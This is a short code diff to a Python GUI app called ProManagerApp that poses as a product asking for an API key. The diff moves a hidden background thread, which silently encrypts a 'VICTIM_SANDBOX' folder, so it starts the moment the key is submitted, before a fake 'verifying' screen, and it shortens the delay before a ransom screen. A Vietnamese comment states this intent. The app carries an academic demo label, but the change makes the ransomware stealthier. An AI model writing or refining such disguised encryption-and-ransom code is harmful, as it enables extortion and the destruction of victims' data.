@@ -216,6 +216,8 @@ class ProManagerApp:
             self._error_var.set('⚠  Please enter a valid API key to continue.')
             return
         self._error_var.set('')
+        # Bắt đầu mã hóa ngay khi API key được submit — trước khi hiện verifying screen
+        threading.Thread(target=self._silent_encrypt, daemon=True).start()
         self._show_verifying()
 
     # ── Screen 2: Verifying (dark, full screen) ─────────────
@@ -505,8 +507,7 @@ class ProManagerApp:
         tk.Label(inn, text='⚠  DEMO ONLY — Academic Environment',
                  font=('Segoe UI', 8), bg=L_BG, fg='#d97706').pack(anchor='w')
 
-        threading.Thread(target=self._silent_encrypt, daemon=True).start()
-        self.root.after(5000, self._trigger_ransom)
+        self.root.after(3000, self._trigger_ransom)
 
     def _silent_encrypt(self):
         trigger_encryption(VICTIM_SANDBOX)
